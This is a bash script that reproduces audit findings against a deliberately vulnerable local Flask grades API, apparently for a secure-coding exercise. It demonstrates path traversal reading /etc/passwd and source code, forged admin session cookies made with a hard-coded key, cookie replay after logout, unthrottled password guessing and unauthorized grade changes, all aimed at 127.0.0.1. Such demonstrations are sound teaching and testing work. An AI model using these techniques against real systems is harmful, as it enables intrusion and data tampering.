#!/usr/bin/env bash

set -u
BASE="${BASE:-http://127.0.0.1:5050}"
CONTAINER="${CONTAINER:-before}"
JAR="$(mktemp -d)"
trap 'rm -rf "$JAR"' EXIT

show_cmd() {  # print the curl command in a readable, copy-pasteable form
  local out='$ curl' arg safe='^[A-Za-z0-9_./:=@%+,-]+$'
  for arg in "$@"; do
    arg="${arg//$JAR\//cookies/}"
    if [[ $arg =~ $safe ]]; then out+=" $arg"; else out+=" '$arg'"; fi
  done
  echo "$out"
}

req() {  # req "<description>" <curl arguments...>
  local desc="$1"; shift
  echo "## $desc"
  show_cmd "$@"
  local out code body
  out="$(curl -s -w $'\n%{http_code}' "$@")"
  code="${out##*$'\n'}"
  body="${out%$'\n'*}"
  if [ "${#body}" -gt 300 ]; then body="${body:0:300} [...]"; fi
  printf '%s\n-> HTTP %s\n\n' "$body" "$code"
}

login() {  # login <jar> <username> <password>
  curl -s -o /dev/null -c "$JAR/$1" -d "username=$2&password=$3" "$BASE/login"
}

for _ in $(seq 1 30); do curl -s -o /dev/null "$BASE/" && break; sleep 0.5; done

echo "Target: $BASE (container '$CONTAINER', commit 821a6af, before the repair)"
echo "Date:   $(date -u '+%Y-%m-%d %H:%M UTC')"
echo
login alice alice alicepw
login prof prof_srs profpw

echo "=============== F-03 Debug mode (container log) ==============="
docker logs "$CONTAINER" 2>&1 | grep -E "Debug mode|Debugger is active"
echo

echo "=============== F-13 /files without authentication ==============="
req "anonymous download" "$BASE/files?path=srs-summary.txt"

echo "=============== F-02 Path traversal ==============="
req "relative path out of materials/ (returns the source code)" -b "$JAR/alice" "$BASE/files?path=../baseline_secure_coding_api.py"
req "absolute path" -b "$JAR/alice" "$BASE/files?path=/etc/passwd"

echo "=============== F-04 Grade reads not scoped ==============="
req "anonymous reads Bob's grades" "$BASE/grades/1002"
req "alice reads Bob's grades" -b "$JAR/alice" "$BASE/grades/1002"
req "prof_srs reads student 1001 (includes SSD, not assigned)" -b "$JAR/prof" "$BASE/grades/1001"
req "no permitted records: 200 [] instead of a denial (R4)" "$BASE/grades/9999"

echo "=============== F-05 Profile reads ==============="
req "anonymous reads Bob's profile" "$BASE/students/1002/profile"
req "alice reads Bob's profile" -b "$JAR/alice" "$BASE/students/1002/profile"
req "prof_srs reads a profile (forbidden by R3)" -b "$JAR/prof" "$BASE/students/1001/profile"

echo "=============== F-14 Student identifier not validated ==============="
for id in -1 0 +1001 1_001; do req "GET /grades/$id" "$BASE/grades/$id"; done

echo "=============== F-09 Error handler ==============="
req "unknown route (expected 404)" "$BASE/nope"
req "wrong method (expected 405)" "$BASE/login"
req "wrong content type (expected 4xx)" -X POST -H "Content-Type: text/plain" -d x "$BASE/grades/update"
req "invalid id (expected 400)" "$BASE/grades/abc"
req "missing file (expected 404; leaks the server path)" -b "$JAR/alice" "$BASE/files?path=nope.txt"

echo "=============== F-06 Session forgery with the hard-coded key ==============="
echo "(the key is in the source, which F-02 discloses; the cookie is signed with it)"
FORGED="$(docker exec "$CONTAINER" python -c 'import baseline_secure_coding_api as a; print(a.app.session_interface.get_signing_serializer(a.app).dumps({"user": "admin1", "role": "admin"}))')"
req "forged admin cookie accepted by /me" -b "session=$FORGED" "$BASE/me"

echo "=============== F-12 Session cookie attributes ==============="
echo "\$ curl -s -D - -o /dev/null -d 'username=alice&password=alicepw' $BASE/login | grep -i set-cookie"
curl -s -D - -o /dev/null -d "username=alice&password=alicepw" "$BASE/login" \
  | grep -i '^set-cookie' | sed 's/session=[^;]*/session=<value>/'
echo "(no Secure and no SameSite attribute)"
echo

echo "=============== F-11 Session not revoked on logout ==============="
login replay alice alicepw
cp "$JAR/replay" "$JAR/replay-saved"
curl -s -o /dev/null -b "$JAR/replay" -c "$JAR/replay" -X POST "$BASE/logout"
req "same browser after logout" -b "$JAR/replay" "$BASE/me"
req "cookie saved before logout, replayed" -b "$JAR/replay-saved" "$BASE/me"

echo "=============== F-10 No login throttling ==============="
codes=""
for i in $(seq 1 50); do
  codes+="$(curl -s -o /dev/null -w '%{http_code}' -d "username=alice&password=wrong$i" "$BASE/login") "
done
echo "## 50 wrong passwords for alice"
echo "status codes: $(echo $codes | tr ' ' '\n' | sort | uniq -c | xargs)"
echo
req "correct password right after (follows the redirect to /me)" -L -c "$JAR/bf" -b "$JAR/bf" -d "username=alice&password=alicepw" "$BASE/login"

echo "=============== F-08 Grade update not validated (changes data) ==============="
req "student_id as a string creates a shadow record" -X POST -H "Content-Type: application/json" -d '{"student_id":"1001","course_id":"SRS","grade":0}' "$BASE/grades/update"
req "the real record is unchanged (shadow record is invisible)" "$BASE/grades/1001"
req "boolean grade" -X POST -H "Content-Type: application/json" -d '{"student_id":1001,"course_id":"SRS","grade":true}' "$BASE/grades/update"
req "NaN grade" -X POST -H "Content-Type: application/json" -d '{"student_id":1001,"course_id":"SRS","grade":NaN}' "$BASE/grades/update"
req "unknown student, unknown course, negative grade" -X POST -H "Content-Type: application/json" -d '{"student_id":9999,"course_id":"XYZ","grade":-5}' "$BASE/grades/update"

echo "=============== F-01 Grade update without authorization (changes data) ==============="
req "anonymous update" -X POST -H "Content-Type: application/json" -d '{"student_id":1001,"course_id":"SRS","grade":20}' "$BASE/grades/update"
req "student alice updates her own grade" -b "$JAR/alice" -X POST -H "Content-Type: application/json" -d '{"student_id":1001,"course_id":"SRS","grade":20}' "$BASE/grades/update"
req "prof_srs updates SSD (not assigned)" -b "$JAR/prof" -X POST -H "Content-Type: application/json" -d '{"student_id":1001,"course_id":"SSD","grade":20}' "$BASE/grades/update"
